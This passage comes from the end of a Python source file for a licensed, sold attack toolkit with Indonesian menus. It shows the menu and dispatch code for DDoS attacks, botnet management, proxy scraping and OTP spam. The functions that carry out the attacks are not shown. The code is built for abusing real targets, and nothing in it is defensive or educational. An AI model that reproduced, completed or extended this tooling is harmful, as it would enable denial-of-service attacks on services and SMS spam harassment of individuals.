        return
    for i, u in enumerate(users, 1):
        print(f"  {i}. {u['id']} | Max: {u['maxtime']}s")
    try:
        idx = int(input("\nNomor yang mau dihapus > ").strip()) - 1
        if idx < 0 or idx >= len(users):
            print(f"{RED}[!] Invalid!{RESET}")
            return
        removed = users.pop(idx)
        save_prem(data)
        print(f"{GREEN}[✓] User {removed['id']} dihapus.{RESET}")
    except:
        print(f"{RED}[!] Input invalid.{RESET}")


# ========== INFO MENU ==========
def info_menu():
    print(BANNER)
    print(f"{CYAN}[ INFO LOOKUP ]{RESET}\n")
    print("1) Lookup Domain")
    print("2) Lookup IP")
    print("3) Kembali")
    choice = input("\nPilih > ").strip()
    if choice == "1":
        web = input("Domain (contoh: google.com) > ").strip()
        if web:
            single_lookup(web)
    elif choice == "2":
        ip = input("IP (contoh: 8.8.8.8) > ").strip()
        if ip:
            single_lookup(ip)
    elif choice == "3":
        return
    input("\nTekan ENTER untuk kembali...")


def show_file(path, label):
    print(BANNER)
    print(f"{CYAN}[ {label} ]{RESET}\n")
    if os.path.exists(path):
        with open(path, "r") as f:
            content = f.read()
            if content.strip():
                print(content)
            else:
                print(f"{YELLOW}[!] File kosong.{RESET}")
    else:
        print(f"{YELLOW}[!] File belum ada: {path}{RESET}")
    input("\nTekan ENTER untuk kembali...")


def ddos_menu():
    ensure_dirs()

    # Ambil config + device info untuk banner
    cfg_ddos = load_config() or {"device_key": "DDOS", "buyer": "Guest", "seller": "FloX"}
    user_ddos = {
        "name": cfg_ddos.get("buyer", "Guest"),
        "seller": cfg_ddos.get("seller", "FloX")
    }

    while True:
        # ─── Tampilkan banner utama flox-tools ─────────────
        device_info = get_device_info()
        show_banner(user_ddos, device_info, cfg_ddos.get("device_key", "DDOS"), 1)
        print()
        print(f"{C.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.RESET}")
        print(f"{C.MAGENTA}{C.BOLD}              ⚔️  DDOS / ATTACK MENU  ⚔️{C.RESET}")
        print(f"{C.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.RESET}\n")

        print(f"  {C.GREEN}[01]{C.RESET} {C.WHITE}🚀 Attack Target{C.RESET}")
        print(f"  {C.GREEN}[02]{C.RESET} {C.WHITE}🌐 Info IP / Domain{C.RESET}")
        print(f"  {C.GREEN}[03]{C.RESET} {C.WHITE}📋 Methods List{C.RESET}")
        print(f"  {C.GREEN}[04]{C.RESET} {C.WHITE}➕ Add Method{C.RESET}")
        print(f"  {C.GREEN}[05]{C.RESET} {C.WHITE}🗑️  Delete Method{C.RESET}")
        print(f"  {C.GREEN}[06]{C.RESET} {C.WHITE}🔍 Search Method{C.RESET}")
        print(f"  {C.GREEN}[07]{C.RESET} {C.WHITE}♻️  Reset Methods{C.RESET}")
        print(f"  {C.GREEN}[08]{C.RESET} {C.WHITE}🕸️  Proxy Scraper ({len(PROXY_URLS)} sumber){C.RESET}")
        print(f"  {C.GREEN}[09]{C.RESET} {C.WHITE}✅ Proxy Checker{C.RESET}")
        print(f"  {C.GREEN}[10]{C.RESET} {C.WHITE}📄 View Proxy{C.RESET}")
        print(f"  {C.GREEN}[11]{C.RESET} {C.WHITE}⚔️  Add Botnet{C.RESET}")
        print(f"  {C.GREEN}[12]{C.RESET} {C.WHITE}✏️  Add Botnet (Manual){C.RESET}")
        print(f"  {C.GREEN}[13]{C.RESET} {C.WHITE}🗑️  Delete Botnet{C.RESET}")
        print(f"  {C.GREEN}[14]{C.RESET} {C.WHITE}📋 List Botnet{C.RESET}")
        print(f"  {C.GREEN}[15]{C.RESET} {C.WHITE}🧪 Test Botnet{C.RESET}")
        print(f"  {C.GREEN}[16]{C.RESET} {C.WHITE}👑 Add Premium{C.RESET}")
        print(f"  {C.GREEN}[17]{C.RESET} {C.WHITE}🔍 Cek Premium{C.RESET}")
        print(f"  {C.GREEN}[18]{C.RESET} {C.WHITE}📊 List Premium{C.RESET}")
        print(f"  {C.GREEN}[19]{C.RESET} {C.WHITE}🗑️  Delete Premium{C.RESET}")
        print(f"  {C.GREEN}[20]{C.RESET} {C.WHITE}📄 Hasil Attack (txt){C.RESET}")
        print(f"  {C.GREEN}[21]{C.RESET} {C.WHITE}📊 Hasil Attack (csv){C.RESET}")
        print(f"  {C.GREEN}[22]{C.RESET} {C.WHITE}❌ Kembali ke Menu Utama{C.RESET}")
        print()
        line()

        try:
            choice = input(f"{C.CYAN} ┌─[{C.RESET}{C.GREEN} P I L I H {C.RESET}{C.CYAN}]\n └──➤ {C.RESET}").strip()
        except (KeyboardInterrupt, EOFError):
            return

        if choice == "1" or choice == "01":
            attack_menu()
            input("\nTekan ENTER untuk kembali...")
        elif choice == "2" or choice == "02":
            info_menu()
        elif choice == "3" or choice == "03":
            show_methods()
            input("\nTekan ENTER untuk kembali...")
        elif choice == "4" or choice == "04":
            add_method()
            input("\nTekan ENTER untuk kembali...")
        elif choice == "5" or choice == "05":
            del_method()
            input("\nTekan ENTER untuk kembali...")
        elif choice == "6" or choice == "06":
            search_method()
            input("\nTekan ENTER untuk kembali...")
        elif choice == "7" or choice == "07":
            reset_methods()
            input("\nTekan ENTER untuk kembali...")
        elif choice == "8" or choice == "08":
            scrape_proxies()
            input("\nTekan ENTER untuk kembali...")
        elif choice == "9" or choice == "09":
            proxy_checker()
            input("\nTekan ENTER untuk kembali...")
        elif choice == "10":
            view_proxy()
            input("\nTekan ENTER untuk kembali...")
        elif choice == "11":
            add_botnet()
            input("\nTekan ENTER untuk kembali...")
        elif choice == "12":
            add_botnet_manual()
            input("\nTekan ENTER untuk kembali...")
        elif choice == "13":
            del_botnet()
            input("\nTekan ENTER untuk kembali...")
        elif choice == "14":
            list_botnet()
            input("\nTekan ENTER untuk kembali...")
        elif choice == "15":
            test_botnet()
            input("\nTekan ENTER untuk kembali...")
        elif choice == "16":
            add_prem()
            input("\nTekan ENTER untuk kembali...")
        elif choice == "17":
            cek_prem()
            input("\nTekan ENTER untuk kembali...")
        elif choice == "18":
            list_prem()
            input("\nTekan ENTER untuk kembali...")
        elif choice == "19":
            del_prem()
            input("\nTekan ENTER untuk kembali...")
        elif choice == "20":
            show_file(OUTFILE, "HASIL ATTACK (TXT)")
        elif choice == "21":
            show_file(CSVFILE, "HASIL ATTACK (CSV)")
        elif choice == "22":
            print(f"\n{C.GREEN}[✓] Keluar dari menu DDoS.{C.RESET}\n")
            return
        else:
            print(f"{C.RED}[!] Pilihan tidak dikenal.{C.RESET}")
            time.sleep(1)


# =========================================================
# MAIN
# =========================================================
def main():
    password_gate()
    play_intro(duration_matrix=2.5)

    device_info = get_device_info()
    cfg = load_config()

    if not cfg:
        cfg = registration_flow(device_info)
        if not cfg:
            print(f"{C.RED}[!] Registrasi gagal. Keluar.{C.RESET}")
            sys.exit(1)

        if not waiting_approval(cfg):
            sys.exit(1)
    else:
        if not startup_check(cfg):
            print(f"{C.RED}[!] Lisensi tidak valid. Keluar.{C.RESET}")
            sys.exit(1)

    Thread(
        target=license_monitor,
        args=(cfg,),
        daemon=True
    ).start()

    user_info = {
        "name": cfg.get("buyer", "Guest"),
        "seller": cfg.get("seller", "FloX")
    }

    while True:
        if not license_guard(cfg):
            sys.exit(1)

        device_info = get_device_info()
        show_banner(user_info, device_info, cfg["device_key"], 1)
        choice = main_menu()

        if choice == "01":
            if license_guard(cfg):
                spam_otp_menu()
        elif choice == "02":
            if license_guard(cfg):
                ip_hunter_menu()
        elif choice == "03":
            if license_guard(cfg):
                ddos_menu()
        elif choice == "04":
            if license_guard(cfg):
                proxy_scraper_menu()
        elif choice == "05":
            if license_guard(cfg):
                device_info_menu(device_info, cfg)
        elif choice == "00":
            clear()
            print(f"\n{C.GREEN}╔══════════════════════════════════════════════════════════╗{C.RESET}")
            print(f"{C.GREEN}║  {C.BOLD}{C.WHITE}👋 TERIMA KASIH SUDAH MENGGUNAKAN FWX TOOLS!{C.RESET}{C.GREEN}           ║{C.RESET}")
            print(f"{C.GREEN}║  {C.WHITE}Author: {AUTHOR} | Version: {VERSION}{C.RESET}{C.GREEN}                        ║{C.RESET}")
            print(f"{C.GREEN}╚══════════════════════════════════════════════════════════╝{C.RESET}\n")
            sys.exit(0)
        else:
            print(f"{C.RED}[!] Pilihan tidak valid!{C.RESET}")
            time.sleep(1)


# =========================================================
# ENTRY POINT
# =========================================================
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{C.YELLOW}[!] Program dihentikan oleh user.{C.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{C.RED}[!] Fatal error: {e}{C.RESET}")
        sys.exit(1)
